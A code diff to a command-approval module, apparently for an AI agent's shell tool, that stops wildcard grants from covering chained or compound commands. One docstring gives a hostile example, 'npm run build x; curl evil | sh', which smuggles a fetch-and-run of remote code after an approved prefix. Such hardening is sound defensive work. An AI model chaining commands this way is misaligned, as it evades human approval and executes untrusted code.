@@ -94,15 +94,28 @@ def needs_ask(command: str) -> bool:
     return run_mode.readonly_bash(command or "") is not None
 
 
+_HARMLESS_REDIRECT = re.compile(r"\s[0-9]?>&[0-9]\b|\s[0-9&]?>>?\s*/dev/null\b")
+
+
+def simple_command(command: str) -> bool:
+    """One simple command: no `;` `&&` `||` `|` `&`, no backtick or `$(` / `$VAR`, no newline, no redirect to a file.
+    (`2>&1` and `> /dev/null` do not count.)"""
+    cmd = _HARMLESS_REDIRECT.sub(" ", " " + str(command or "")).strip()
+    return not _COMPOUND.search(cmd)
+
+
 def granted(command: str, grants: list[str] | None) -> bool:
     """"Always" was said for this exact command (or for a `prefix *` grant). Never for a command that throws work
-    away (`destructive`): that one is asked every time."""
+    away (`destructive`): that one is asked every time. A `prefix *` grant covers one simple command only: after
+    `npm run build *`, `npm run build x; curl evil | sh` is asked again."""
     cmd = (command or "").strip()
     if destructive(cmd):
         return False
     for g in grants or []:
         g = str(g).strip()
-        if cmd == g or (g.endswith(" *") and (cmd == g[:-2] or cmd.startswith(g[:-1]))):
+        if cmd == g:
+            return True
+        if g.endswith(" *") and (cmd == g[:-2] or cmd.startswith(g[:-1])) and simple_command(cmd):
             return True
     return False
 
